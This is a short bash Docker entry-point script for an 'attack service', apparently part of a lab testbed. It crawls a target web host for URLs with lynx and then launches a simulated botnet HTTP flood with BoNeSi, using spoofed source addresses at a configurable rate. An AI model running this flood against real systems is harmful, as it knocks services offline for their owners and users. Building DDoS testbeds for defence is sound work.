#!/bin/bash
############
# Docker Entry Point for Attack Service
# @author Oliver Hader <oliver@typo3.org>
# @date May 2019
############

function checkAttackHost {
    touch check.txt
    curl -s -I ${ATTACK_HOST_CHECK} -o check.txt
    RETURN_CURL=$?
    grep 'HTTP/1.1 404' check.txt > /dev/null
    RETURN_GREP=$?
}

echo "+ Updating package lists"
apt-get update > /dev/null

echo "+ Waiting for attack host to become ready"
checkAttackHost
while [ "${RETURN_CURL}" != "0" ] || [ "${RETURN_GREP}" == "0" ]
do
    echo "  Retrying ${ATTACK_HOST_CHECK}"
    sleep 2
    checkAttackHost
done

ping ${ATTACK_SERVICE} -c 1 > /dev/null
BRIDGE=$(ip neigh show | grep -F ${ATTACK_SERVICE} | cut -d ' ' -f 3)

echo "+ Using brigde ${BRIDGE}"

echo "+ Generating attack URLs..."
lynx -listonly -nonumbers -dump -nolog ${ATTACK_HOST} | grep -E "^${ATTACK_HOST}" > attack-urls.txt

echo "----------------------------------------"

if [ "${ATTACK_TYPE:-none}" == "bonesi" ]
then
    if [ ! -f ${ATTACK_BONESI_ADDRESSES:-local-network.txt} ]
    then
        ATTACK_BONESI_ADDRESSES=local-network.txt
    fi

    echo "+ Starting botnet attack..."
    echo "----------------------------------------"
    bonesi -i ${ATTACK_BONESI_ADDRESSES} -b bonesi/browserlist.txt -p tcp -d ${BRIDGE} -r ${ATTACK_RATE:-1} -l attack-urls.txt ${ATTACK_SERVICE}:80 -c ${ATTACK_PACKETS:-0}
fi

exec sleep infinity